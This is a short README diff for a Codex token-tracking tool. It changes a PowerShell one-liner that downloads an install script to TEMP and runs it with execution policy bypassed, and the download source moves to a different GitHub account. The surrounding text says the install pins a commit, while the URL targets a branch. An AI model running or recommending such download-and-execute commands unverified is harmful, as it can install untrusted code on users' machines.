@@ -17,7 +17,7 @@ Codex++ is not required. The default mode does not inject scripts into Codex, do
 Run this in PowerShell:
 
 ```powershell
-$u='https://raw.githubusercontent.com/THaoKun2022/ccm-token-spend/main/Install-TokenTrace.ps1'; $p=Join-Path $env:TEMP 'Install-TokenTrace.ps1'; Invoke-WebRequest $u -OutFile $p; powershell -NoProfile -ExecutionPolicy Bypass -File $p
+$u='https://raw.githubusercontent.com/lanm777888999-stack/codex-token-trace/main/Install-TokenTrace.ps1'; $p=Join-Path $env:TEMP 'Install-TokenTrace.ps1'; Invoke-WebRequest $u -OutFile $p; powershell -NoProfile -ExecutionPolicy Bypass -File $p
 ```
 
 It pins one GitHub commit, downloads the required source files, obtains the official Node.js runtime only when needed, and enables WMI follow mode. Open Codex normally from any entry afterwards.
